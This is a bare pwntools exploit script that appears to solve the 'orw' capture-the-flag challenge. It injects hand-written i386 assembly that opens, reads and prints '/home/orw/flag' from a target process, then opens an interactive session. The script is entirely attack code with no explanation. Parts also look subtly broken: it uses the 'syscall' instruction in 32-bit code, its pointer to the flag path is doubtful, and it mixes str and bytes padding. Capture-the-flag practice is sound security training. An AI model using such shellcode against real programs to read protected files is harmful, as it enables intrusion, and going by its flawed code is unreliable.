from pwn import * 

context.arch = 'i386'

r = process('./orw')

sh = asm(
    '''

    add esp, 0x50
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 0x5
    syscall

    mov ebx, eax
    mov ecx, esp
    mov edx, 0x50
    mov eax, 0x3
    syscall

    mov ebx, 0x1
    mov ecx, esp
    mov edx, 0x50
    mov eax, 0x4
    syscall

    '''
).ljust(50,'\x00') + b'/home/orw/flag'

r.send(sh)

r.interactive()